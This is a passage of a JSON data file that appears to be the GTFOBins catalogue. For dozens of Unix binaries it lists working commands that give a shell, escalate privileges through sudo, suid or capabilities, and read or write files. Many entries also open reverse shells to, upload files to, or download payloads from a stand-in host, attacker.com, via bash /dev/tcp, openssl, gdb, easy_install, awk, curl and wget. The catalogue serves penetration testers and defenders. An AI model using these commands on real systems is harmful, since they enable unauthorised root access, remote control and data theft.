LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT);'\n"}], "suid": [{"code": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'\n"}], "sudo": [{"code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"}], "capabilities": [{"code": "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"}]}, "curl": {"file-upload": [{"description": "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.", "code": "URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d @$file_to_send $URL\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE\n"}], "file-read": [{"description": "The file path must be absolute.", "code": "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n"}], "suid": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"}], "sudo": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo -E curl $URL -o $LFILE\n"}]}, "uuencode": {"file-read": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}], "suid": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "cut": {"file-read": [{"code": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"}]}, "gem": {"shell": [{"description": "This requires the name of an installed gem to be provided (`rdoc` is usually installed).", "code": "gem open -e \"/bin/sh -c /bin/sh\" rdoc"}, {"description": "This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).", "code": "gem open rdoc\n:!/bin/sh\n"}, {"description": "This executes the specified file as [`ruby`](/gtfobins/ruby/) code.", "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x\n"}, {"description": "This executes the specified file as [`ruby`](/gtfobins/ruby/) code.", "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x\n"}], "sudo": [{"description": "This requires the name of an installed gem to be provided (`rdoc` is usually installed).", "code": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"}]}, "tac": {"file-read": [{"code": "LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"}]}, "ftp": {"shell": [{"code": "ftp\n!/bin/sh\n"}], "file-upload": [{"description": "Send local file to a FTP server.", "code": "RHOST=attacker.com\nftp $RHOST\nput file_to_send\n"}], "file-download": [{"description": "Fetch a remote file from a FTP server.", "code": "RHOST=attacker.com\nftp $RHOST\nget file_to_get\n"}], "sudo": [{"code": "sudo ftp\n!/bin/sh\n"}]}, "cp": {"file-read": [{"code": "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout\n"}], "file-write": [{"code": "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"}, {"description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n"}, {"description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n"}]}, "pic": {"shell": [{"code": "pic -U\n.PS\nsh X sh X\n"}], "sudo": [{"code": "sudo pic -U\n.PS\nsh X sh X\n"}], "limited-suid": [{"code": "./pic -U\n.PS\nsh X sh X\n"}]}, "smbclient": {"shell": [{"code": "smbclient '\\\\attacker\\share'\n!/bin/sh\n"}], "file-upload": [{"description": "Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.", "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n"}], "file-download": [{"description": "Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.", "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n"}], "sudo": [{"code": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"}]}, "nice": {"shell": [{"code": "nice /bin/sh"}], "suid": [{"code": "./nice /bin/sh -p"}], "sudo": [{"code": "sudo nice /bin/sh"}]}, "rake": {"shell": [{"code": "rake -p '`/bin/sh 1>&0`'"}], "sudo": [{"code": "sudo rake -p '`/bin/sh 1>&0`'"}], "limited-suid": [{"code": "./rake -p '`/bin/sh 1>&0`'"}]}, "wish": {"shell": [{"code": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}], "non-interactive-reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish\n"}], "sudo": [{"code": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}]}, "gdb": {"shell": [{"code": "gdb -nx -ex '!sh' -ex quit"}], "reverse-shell": [{"description": "This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit\n"}], "file-upload": [{"description": "This requires that GDB is compiled with Python support. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit\n"}, {"description": "This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit\n"}], "file-download": [{"description": "This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit\n"}], "file-write": [{"description": "This requires that GDB is compiled with Python support.", "code": "LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit\n"}], "file-read": [{"description": "This requires that GDB is compiled with Python support.", "code": "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"}], "library-load": [{"description": "This requires that GDB is compiled with Python support.", "code": "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"}], "suid": [{"description": "This requires that GDB is compiled with Python support.", "code": "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"}], "sudo": [{"code": "sudo gdb -nx -ex '!sh' -ex quit"}], "capabilities": [{"description": "This requires that GDB is compiled with Python support.", "code": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"}]}, "crash": {"shell": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "crash -h\n!sh\n"}], "command": [{"code": "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h\n"}], "sudo": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo crash -h\n!sh\n"}]}, "dmsetup": {"sudo": [{"code": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"}], "suid": [{"code": "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"}]}, "awk": {"shell": [{"code": "awk 'BEGIN {system(\"/bin/sh\")}'"}], "non-interactive-reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}], "non-interactive-bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}], "file-write": [{"code": "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}], "file-read": [{"code": "LFILE=file_to_read\nawk '//' \"$LFILE\"\n"}], "sudo": [{"code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"}], "limited-suid": [{"code": "./awk 'BEGIN {system(\"/bin/sh\")}'"}]}, "hd": {"file-read": [{"code": "LFILE=file_to_read\nhd \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./hd \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"}]}, "taskset": {"shell": [{"code": "taskset 1 /bin/sh"}], "suid": [{"code": "./taskset 1 /bin/sh -p"}], "sudo": [{"code": "sudo taskset 1 /bin/sh"}]}, "ed": {"shell": [{"code": "ed\n!/bin/sh\n"}], "file-write": [{"code": "ed file_to_write\na\nDATA\n.\nw\nq\n"}], "file-read": [{"code": "ed file_to_read\n,p\nq\n"}], "sudo": [{"code": "sudo ed\n!/bin/sh\n"}], "limited-suid": [{"code": "./ed\n!/bin/sh\n"}]}, "mv": {"suid": [{"code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"}]}, "tar": {"shell": [{"code": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}, {"description": "This only works for GNU tar.", "code": "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"}, {"description": "This only works for GNU tar. It can be useful when only a limited command argument injection is available.", "code": "TF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*\n"}], "file-upload": [{"description": "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).", "code": "export RHOST=attacker.com\nexport RUSER=root\nexport RFILE=/tmp/file_to_send.tar\nexport LFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh\n"}], "file-download": [{"description": "This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).", "code": "export RHOST=attacker.com\nexport RUSER=root\nexport RFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh\n"}], "file-write": [{"description": "This only works for GNU tar.", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P\n"}], "file-read": [{"description": "This only works for GNU tar.", "code": "LFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'\n"}], "sudo": [{"code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}], "limited-suid": [{"code": "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}]}, "easy_install": {"shell": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n"}], "reverse-shell": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF\n"}], "file-upload": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\neasy_install $TF\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request. The file path must be absolute.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF\n"}], "file-write": [{"description": "The file path must be absolute.", "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n"}], "file-read": [{"description": "The read file content is wrapped within program messages.", "code": "TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF\n"}], "library-load": [{"code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF\n"}], "sudo": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"}]}, "tclsh": {"shell": [{"code": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}], "non-interactive-reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh\n"}], "suid": [{"code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"}], "sudo": [{"code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"}]}, "puppet": {"shell": [{"code": "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"}], "file-write": [{"description": "The file path must be absolute.", "code": "export LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\"\n"}], "file-read": [{"description": "The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.", "code": "export LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE\n"}], "sudo": [{"code": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"}]}, "nsenter": {"shell": [{"code": "nsenter /bin/sh"}], "sudo": [{"code": "sudo nsenter /bin/sh"}]}, "ash": {"shell": [{"code": "ash"}], "file-write": [{"code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n"}], "suid": [{"code": "./ash"}], "sudo": [{"code": "sudo ash"}]}, "lwp-request": {"file-read": [{"code": "LFILE=file_to_read\nlwp-request \"file://$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./lwp-request \"file://$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"}]}, "crontab": {"command": [{"description": "The commands are executed according to the crontab file edited via the `crontab` utility.", "code": "crontab -e"}], "sudo": [{"description": "The commands are executed according to the crontab file edited via the `crontab` utility.", "code": "sudo crontab -e"}]}, "mawk": {"shell": [{"code": "mawk 'BEGIN {system(\"/bin/sh\")}'"}], "file-write": [{"code": "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}], "file-read": [{"code": "LFILE=file_to_read\nmawk '//' \"$LFILE\"\n"}], "sudo": [{"code": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"}], "limited-suid": [{"code": "./mawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "xxd": {"file-write": [{"code": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n"}], "file-read": [{"code": "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r\n"}], "suid": [{"code": "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"}]}, "openssl": {"reverse-shell": [{"description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"}], "file-upload": [{"description": "To collect the file run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\nSend a local file via TCP. Transmission will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\"\n"}], "file-download": [{"description": "To send the file run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\nFetch a file from a TCP port, transmission will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\"\n"}], "file-write": [{"code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"}, {"code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\"\n"}], "file-read": [{"code": "LFILE=file_to_read\nopenssl enc -in \"$LFILE\"\n"}], "suid": [{"description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"}, {"code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"}], "sudo": [{"description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"}], "library-load": [{"code": "openssl req -engine ./lib.so"}]}, "od": {"file-read": [{"code": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"}]}, "wget": {"file-upload": [{"description": "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nwget --post-file=$LFILE $URL\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nwget $URL -O $LFILE\n"}], "suid": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE\n"}], "sudo": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nsudo -E wget $URL -O $LFILE\n"}]}, "dialog": {"file-read": [{"code": "LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0\n"}], "suid": [{"code": "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"}]}, "ul": {"file-read": [{"code": "LFILE=file_to_read\nul \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./ul \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"}]}, "whois": {"file-upload": [{"description": "Send a text file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. The file has a trailing `$'\\x0d\\x0a'` and its length is limited by the maximum size of arguments.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\"\n"}, {"description": "Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`base64 $LFILE`\"\n"}], "file-download": [{"description": "Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file. The file has instances of `$'\\x0d'` stripped.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n"}, {"description": "Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | nc -l -p 12345` on the attacker box to send the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\"\n"}]}, "file": {"file-read": [{"description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.", "code": "LFILE=file_to_read\nfile -f $LFILE\n"}, {"description": "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\nIt can also be provided with a directory and will read each file in the directory.\n", "code": "LFILE=file_to_read\nfile -m $LFILE\n"}], "suid": [{"description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.", "code": "LFILE=file_to_read\n./file -f $LFILE\n"}], "sudo": [{"description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.", "code": "LFILE=file_to_read\nsudo file -f $LFILE\n"}]}, "busybox": {"shell": [{"code": "busybox sh"}], "file-upload": [{"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=12345\nbusybox httpd -f -p $LPORT -h .\n"}], "file-write": [{"code": "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'\n"}], "file-read": [{"code": "LFILE=file_to_read\n./busybox cat \"$LFILE\"\n"}], "suid": [{"description": "It may drop the SUID privileges depending on the compilation flags and the runtime configuration.", "code": "./busybox sh"}], "sudo": [{"code": "sudo busybox sh"}]}, "gcc": {"shell": [{"code": "gcc -wrapper /bin/sh,-s ."}], "sudo": [{"code": "sudo gcc -wrapper /bin/sh,-s ."}]}, "start-stop-daemon": {"shell": [{"code": "start-stop-daemon -n $RANDOM -S -x /bin/sh"}], "suid": [{"code": "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"}], "sudo": [{"code": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"}]}, "chown": {"suid": [{"code": "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"}]}, "ssh": {"shell": [{"description": "Reconnecting may help bypassing restricted shells.", "code": "ssh localhost $SHELL --noprofile --norc"}, {"description": "Spawn interactive shell through ProxyCommand option.", "code": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"}], "file-upload": [{"description": "Send local file to a SSH server.", "code": "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH\n"}], "file-download": [{"description": "Fetch a remote file from a SSH server.", "code": "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH\n"}], "file-read": [{"description": "The read file content is corrupted by error prints.", "code": "LFILE=file_to_read\nssh -F $LFILE localhost\n"}], "sudo": [{"description": "Spawn interactive root shell through ProxyCommand option.", "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"}]}, "sqlite3": {"shell": [{"code": "sqlite3 /dev/null '.shell /bin/sh'"}], "file-write": [{"code": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n"}], "file-read": [{"code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"}], "sudo": [{"code": "sudo sqlite3 /dev/null '.shell /bin/sh'"}], "limited-suid": [{"code": "./sqlite3 /dev/null '.shell /bin/sh'"}]}, "bash": {"shell": [{"code": "bash"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'\n"}], "file-upload": [{"description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"}, {"description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET 